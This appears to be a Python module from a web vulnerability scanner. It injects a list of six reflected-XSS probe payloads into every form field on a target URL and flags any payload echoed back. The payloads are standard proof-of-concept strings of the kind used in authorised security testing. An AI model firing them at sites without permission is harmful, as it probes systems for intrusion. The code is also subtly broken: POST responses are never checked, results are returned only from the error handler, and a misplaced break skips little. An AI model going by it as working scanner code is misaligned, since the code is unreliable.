import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from scanner.forms import get_forms, extract_form_details

XSS_PAYLOADS = [
    "<script>alert(1337)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "';alert(1);//",
    "<body onload=alert(1)>"
]

def test_xss(url):
    vulnerable = []

    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} form(s) on {url}")

    for i, form in enumerate(forms, 1):
        details = extract_form_details(form, url)
        target_url = details["action"]
        method = details["method"]

        for payload in XSS_PAYLOADS:
            data = {}
            for field in details["fields"]:
                if field["name"]:
                    data[field["name"]] = payload

                    print(f"  [Form {i}] Testing payload: {payload[:30]}...")

                    try:
                        if method == "post":
                            res = requests.post(target_url, data=data, timeout=5)
                        else:
                            res = requests.get(target_url, params=data, timeout=5)

                            if payload in res.text:
                                print(f"    [⚠️] Payload reflected! Possible XSS with: {payload}")
                                vulnerable.append((target_url, data, payload))
                                break  # Found vulnerability, skip to next form
                            else:
                                print(f"    [✔] No reflection for this payload.")

                    except Exception as e:
                        print(f"    [!] Error during XSS test: {e}")

                        return vulnerable
